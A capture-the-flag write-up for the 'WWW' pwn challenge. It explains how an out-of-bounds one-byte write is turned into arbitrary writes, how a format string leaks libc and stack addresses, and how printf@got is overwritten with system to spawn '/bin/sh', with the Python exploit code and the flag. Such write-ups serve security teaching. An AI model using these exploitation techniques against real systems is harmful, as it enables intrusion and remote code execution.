# WWW - Solution

Created by Yarin ([GitHub](https://github.com/CmdEngineer) / [Twitter](https://twitter.com/CmdEngineer_))\
Writeup written by moka

## Description
> challenge[pwn] = me\
`nc challenges1.hexionteam.com 3002`


## Solution
we get a binary that allows us to write any "*one*" character we want\
into the a buffer on the stack containing "Hello World!",\
using any long-long-int we choose as the index.

```c
int main(void) {  
	setvbuf(stdout, NULL, _IONBF, 0);
    int amount = 1;
    char buf[] = "Hello World!";
    while (amount--) {
        write(what(), where(), buf);
    }
    printf(buf);
}
```
it loops over the write `amount` times,\
and since `amount` is a stack variable, we can change it
and then write anywhere we want for an arbitrary amount of times!
<br>
<br>
now the first thing I'll do is create a function that'll do all that for me:

```python
def write(what, where, last=False):
	p.sendline('-7\n' + chr(len(what) + (0 if last else 1)))
	msg = b''
	for c in what:
		msg += str(where).encode() + b'\n' + bytes([c]) + b'\n'
		where += 1
	print(msg)
	p.send(msg)
```

the function changes the counter (which is buffer[-7]) to the size of the\
thing we want to write (+1 if it's not the last thing we're writing so we can redo the process).
<br>
<br>
now, to the exploit itself:
```python
# ret to ret (because stack alignment) and then to main, also leak printf@got and stack mapping
write(p64(elf.got['printf']), 0x2d + 16)  # printf got addr for leak
write(p64(main_func.address), 0x2d + 8) # RIP(2) -> ret back to main
write(p64(main_func.address + main_func.size - 1), 0x2d) # RIP(1) -> ret to ret
write(b"%10$llx %15$s\x00", 0, True) # leak stack and libc
```
we leak an address from the stack so we can calculate the offset from the buffer to printf@got\
and also the address of printf so we can find system within libc.
<br><br>
after calculating all those addresses we can overwrite printf@got with the address of system\
and then change the input buffer to "/bin/sh" which gets passed to printf (now system). 
```python
# write address of system into printf@got
write(p64(sys_addr)[:3], -offset)
write(b'/bin/sh\x00', 0, True)
p.interactive()
```
and - we have a shell.
<br><br><br>
Flag: `hexCTF{wh0_wh1ch_why_wh3n?}`
